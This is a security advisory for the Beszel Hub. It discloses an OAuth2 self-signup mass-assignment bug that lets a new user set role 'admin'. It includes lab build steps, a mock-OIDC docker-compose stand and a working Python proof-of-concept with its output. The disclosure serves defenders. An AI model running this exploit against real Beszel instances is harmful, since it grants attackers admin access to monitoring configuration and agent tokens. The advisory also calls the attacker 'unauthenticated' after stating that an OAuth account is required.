## Summary | Field | Value | | --------------- | ----------------------------------------------------------------------------------------------------------------------------------- | | **Advisory ID** | GHSA-wqvf-7262-m7g8 | | **Package** | `beszel` (Hub, GitHub: `github.com/henrygd/beszel`) | | **Ecosystem** | Go / PocketBase web application (Docker) | | **Severity** | **Medium** | | **CVSS v3.1** | `5.4` (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) | | **CWE** | CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
CWE-269 (Improper Privilege Management) | | **CVE** | To be assigned (if maintainers disclose) | | **Affected** | Hub builds where `USER_CREATION=true` and an OAuth2/OIDC provider is enabled | | **Patched** | [f7fd3ef](https://github.com/henrygd/beszel/commit/f7fd3ef403085b64dc8a21a02011105b2251333a) | ## 1. Background Beszel Hub uses PocketBase as its data layer. When self-service OAuth/OIDC sign-up is enabled (`USER_CREATION=true`), a new OAuth user is supposed to get the regular `user` role. The sign-up path instead accepts attacker-controlled extra fields, and `users.role` is writable during OAuth record creation - so an attacker can self-assign `admin`. **Threat model.** The attacker must possess a genuine account at the configured OAuth/OIDC provider (this is **not** an authentication bypass). The impact is privilege escalation from `user` (self-service OAuth sign-up) to `admin`. ## 2. Description When `USER_CREATION=true`, Beszel allows OAuth2-based creation of `users` records using the rule: ```go cr := "@request.context = 'oauth2'" usersCollection.CreateRule = &cr ``` The OAuth2 `createData` payload can include writable user fields, including `role`. Since the `role` field accepts `admin`, an attacker registering a new OAuth2 account can supply `role: "admin"`. The default-role hook only assigns `user` when the role is empty: ```go if e.Record.GetString("role") == "" { e.Record.Set("role", "user") } ``` Therefore, an attacker-supplied `admin` value remains unchanged and is persisted to the new account. Beszel authorization subsequently trusts this stored value directly: ```go e.Auth.GetString("role") == "admin" ``` As a result, an unauthenticated attacker able to register through OAuth2 can create an administrative account and access admin-only functionality, including sensitive endpoints such as `/api/beszel/config-yaml`. ## 3. Reproduction ### 3.1 Prerequisites - Docker with Compose (v5.5+). - A checkout of the affected revision (verified: `6a7b2772`). - A local OIDC provider **or** any real OAuth2/OIDC provider. - This PoC uses the ready-made container `ghcr.io/navikt/mock-oauth2-server` so the stand runs fully offline (no external accounts). - Two OIDC identities: `control` (negative control) and `verify` (main check). ### 3.2 Expected result | Test | `createData` | Expected recorded `role` | | ------------------- | --------------------- | ------------------------ | | Negative control | `{}` (no role) | `user` | | Vulnerability check | `{ "role": "admin" }` | `admin` **← bug** | ## 4. Build the vulnerable container (reproducibility) The image used in this advisory (`beszel-oauth-lab:6a7b2772`) is not published and must be built from source at the verified revision. The frontend must be built first because the Go binary embeds `internal/site/dist`. ```bash git clone https://github.com/henrygd/beszel.git cd beszel export TEST_REV=6a7b2772d90c732077a910ca03bb79b13c4fe8c6 export LAB_DIR="$(mktemp -d /tmp/beszel-lab.XXXXXX)" git archive "$TEST_REV" | tar -x -C "$LAB_DIR" ``` Build the frontend using Bun: ```bash docker run --rm \ -v "$LAB_DIR:/src" \ -w /src/internal/site \ oven/bun:1 \ sh -lc 'bun install && bun run build' ``` Alternatively, with Bun installed locally: ```bash cd "$LAB_DIR/internal/site" bun install bun run build ``` Verify that `dist` was created: ```bash test -n "$(ls -A "$LAB_DIR/internal/site/dist" 2>/dev/null)" \ && echo "frontend OK" \ || echo "missing dist" ``` Then build the Hub image from the repository root: ```bash cd "$LAB_DIR" docker build \ --file internal/dockerfile_hub \ --tag beszel-oauth-lab:6a7b2772 \ . ``` Optionally verify the resulting image: ```bash docker image inspect beszel-oauth-lab:6a7b2772 --format '{{.Id}}' ``` The image digest may differ between builds and is not an acceptance criterion. ## 5. File contents (stand) ### 5.1 `lab/docker-compose.yaml` ```yaml services: hub: image: beszel-oauth-lab:6a7b2772 # built from verified revision environment: APP_URL: http://127.0.0.1:18090 USER_CREATION: "true" ports: - "127.0.0.1:18090:8090" volumes: - hub_data:/beszel_data depends_on: - oidc oidc: image: ghcr.io/navikt/mock-oauth2-server:latest environment: JSON_CONFIG_PATH: /config/oidc-config.json volumes: - ./oidc-config.json:/config/oidc-config.json:ro ports: - "127.0.0.1:18140:8080" verifier: image: python:3.13-alpine command: ["python3", "-m", "http.server", "8000", "--directory", "/site"] ports: - "127.0.0.1:18100:8000" volumes: - ./verifier:/site:ro volumes: hub_data: ``` ### 5.2 `lab/oidc-config.json` ```json { "interactiveLogin": true, "tokenCallbacks": [ { "issuerId": "default", "requestMappings": [ { "requestParam": "subject", "match": "control", "claims": { "sub": "control-user", "email": "control@lab.test", "email_verified": true, "name": "Control User", "preferred_username": "control" } }, { "requestParam": "subject", "match": "verify", "claims": { "sub": "verify-user", "email": "verify@lab.test", "email_verified": true, "name": "Verify User", "preferred_username": "verify" } } ] } ] } ``` Then run in `lab` directory: ```bash docker compose up -d ``` ### 5.3 PocketBase OAuth2 provider registration (superuser API) Manually register a superuser and remember login and password. `oauth2` field on the `users` collection, set via `PATCH /api/collections/users`: ```python import requests HUB = "http://127.0.0.1:18090" ADMIN_EMAIL = "" ADMIN_PASS = "" S = requests.Session() tok = S.post(HUB + "/api/collections/_superusers/auth-with-password", json={"identity": ADMIN_EMAIL, "password": ADMIN_PASS}).json()["token"] providers = { "oauth2": { "enabled": True, "mappedFields": { "id": "", "name": "name", "username": "preferred_username", "email": "email", }, "providers": [{ "name": "oidc", "clientId": "beszel-lab", "clientSecret": "beszel-lab-secret", "authURL": "http://127.0.0.1:18140/default/authorize", "tokenURL": "http://oidc:8080/default/token", "userInfoURL": "http://oidc:8080/default/userinfo", "redirectURL": "http://127.0.0.1:18090/api/oauth2-redirect", "scopes": ["openid", "profile", "email"], }], }, } r = S.patch(HUB + "/api/collections/users", headers={"Authorization": tok}, json=providers) print("PATCH", r.status_code) m = S.get(HUB + "/api/collections/users/auth-methods").json() print("providers:", [p["name"] for p in m["oauth2"]["providers"]]) ``` ## 6. Proof of Concept `poc.py` performs a real Authorization-Code + PKCE login against the Hub, then passes `createData`. (For an isolated lab stand only.) ```python #!/usr/bin/env python3 import requests, base64, hashlib, os, urllib.parse, sys OIDC = "http://127.0.0.1:18140" # mock provider HUB = "http://127.0.0.1:18090" # beszel hub S = requests.Session() def provider_name(): """Discover the real OAuth2 provider name from PocketBase (avoids hardcoding).""" m = S.get(HUB + "/api/collections/users/auth-methods").json() provs = m.get("oauth2", {}).get("providers", []) if not provs: sys.exit("No OAuth2 provider registered in Hub. Configure it first.") return provs[0]["name"] def pkce(): v = base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=") c = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).decode().rstrip("=") return v, c def oauth_code(subject): v, c = pkce() redir = urllib.parse.quote(HUB + "/api/oauth2-redirect", safe="") auth = ("{}/default/authorize?client_id=beszel-lab&response_type=code" "&scope=openid%20email%20profile&redirect_uri={}&code_challenge={}" "&code_challenge_method=S256&state=st").format(OIDC, redir, c) S.get(auth) # login page r = S.post(auth, data={"username": subject}) # interactive login -> redirect w/ code q = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query) if "code" not in q: for hist in r.history: loc = hist.headers.get("Location") if loc: qq = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query) if "code" in qq: return qq["code"][0], v sys.exit("no code in redirect chain (final url: %s)" % r.url) return q["code"][0], v def signup(prov, subject, create_data): code, verifier = oauth_code(subject) r = S.post(HUB + "/api/collections/users/auth-with-oauth2", json={ "provider": prov, "code": code, "codeVerifier": verifier, "createData": create_data, }) d = r.json() rec = d.get("record", {}) if r.status_code != 200: print(" subject=%-8s ERROR %s: %s" % (subject, r.status_code, d.get("message", ""))) print(" %s" % d.get("data", {})) return None print(" subject=%-8s role=%r email=%s" % (subject, rec.get("role"), rec.get("email"))) return r if __name__ == "__main__": prov = provider_name() print("provider in use:", prov) signup(prov, "control", {}) signup(prov, "verify", {"role": "admin"}) # live login as the crafted admin code, verifier = oauth_code("verify") auth = S.post(HUB + "/api/collections/users/auth-with-oauth2", json={ "provider": prov, "code": code, "codeVerifier": verifier, "createData": {}, }).json() tok = auth.get("token") if not tok: print("WARN: no token from live login:", auth) sys.exit(1) print("login role:", auth["record"]["role"], "| admin token issued:", bool(tok)) print("GET /api/beszel/info\t->", S.get(HUB + "/api/beszel/info", headers={"Authorization": tok}).status_code) print("GET /api/beszel/config-yaml\t->", S.get(HUB + "/api/beszel/config-yaml", headers={"Authorization": tok}).status_code) ``` **Observed output (verified stand):** ```text subject=control role='user' email=control@lab.test subject=verify role='admin' email=verify@lab.test login role: admin | admin token issued: True GET /api/beszel/info -> 200 GET /api/beszel/config-yaml -> 200 ``` Stored records (superuser read of `GET /api/collections/users/records`): ```text id=... email=control@lab.test role=user id=... email=verify@lab.test role=admin ← privilege escalation ``` ## 7. Impact An attacker who can sign up via OAuth/OIDC (any valid account at the configured provider) can register as a **admin**, gaining: - `GET /api/beszel/config-yaml` - full systems configuration, user assignments, and agent fingerprint tokens; - heartbeat/alert management endpoints and any other `requireAdminRole` - gated API; However, the Beszel `admin` role is distinct from a PocketBase `superuser` and does not provide unrestricted control over the Hub. Severity: **Medium** (privilege escalation from self-registered normal user to administrator, requiring an existing OAuth identity but no other prior access).
repo.summary: OAuth self-signup role escalation via mass assignment
